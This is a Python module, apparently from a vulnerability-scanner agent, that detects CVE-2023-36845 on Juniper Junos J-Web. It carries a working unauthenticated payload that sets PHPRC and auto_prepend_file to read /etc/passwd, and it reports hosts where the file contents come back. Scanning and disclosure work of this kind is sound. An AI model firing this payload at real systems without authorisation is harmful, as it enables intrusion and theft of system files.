"""Agent Asteroid implementation for CVE-2023–36845"""

import re

from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Juniper Junos OS EX Series and SRX Series PHP External Variable Modification Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2023–36845"
VULNERABILITY_DESCRIPTION = (
    "A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS "
    "on EX Series and SRX Series allows an unauthenticated, network-based attacker to remotely execute code. "
    "Using a crafted request which sets the variable PHPRC an attacker is able to modify the PHP execution environment "
    "allowing the injection und execution of code. This issue affects Juniper Networks Junos OS on EX Series and SRX "
    "Series: "
    "* All versions prior to 20.4R3-S9; "
    "* 21.1 versions 21.1R1 and later; "
    "* 21.2 versions prior to 21.2R3-S7; "
    "* 21.3 versions prior to 21.3R3-S5; "
    "* 21.4 versions prior to 21.4R3-S5; * 22.1 versions prior to 22.1R3-S4; "
    "* 22.2 versions prior to 22.2R3-S2; "
    "* 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; "
    "* 22.4 versions prior to 22.4R2-S1, 22.4R3; "
    "* 23.2 versions prior to 23.2R1-S1, 23.2R2."
)

DEFAULT_TIMEOUT = 90
JUNIPER_KEYWORD = "Juniper"
PASSWD_PATTERN = re.compile("root:.*:0:0:")
PAYLOAD = {
    "auto_prepend_file": (None, "/etc/passwd\n"),
    "PHPRC": (None, "/dev/fd/0"),
}


@exploits_registry.register
class CVE202336845Exploit(definitions.Exploit):
    """
    CVE-2023–36845: Juniper Junos OS EX Series and SRX Series PHP External Variable Modification Vulnerability
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(target.url, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return resp.status_code == 200 and JUNIPER_KEYWORD in resp.text

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        try:
            resp = self.session.post(target.url, files=PAYLOAD, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return []

        if PASSWD_PATTERN.search(resp.text) is None:
            return []

        vulnerability = self._create_vulnerability(target.origin)
        return [vulnerability]

    def _create_vulnerability(self, target_uri: str) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "supportportal.juniper.net": "https://supportportal.juniper.net/s/article/"
                "2023-08-Out-of-Cycle-Security-Bulletin-Junos-"
                "OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-"
                "in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
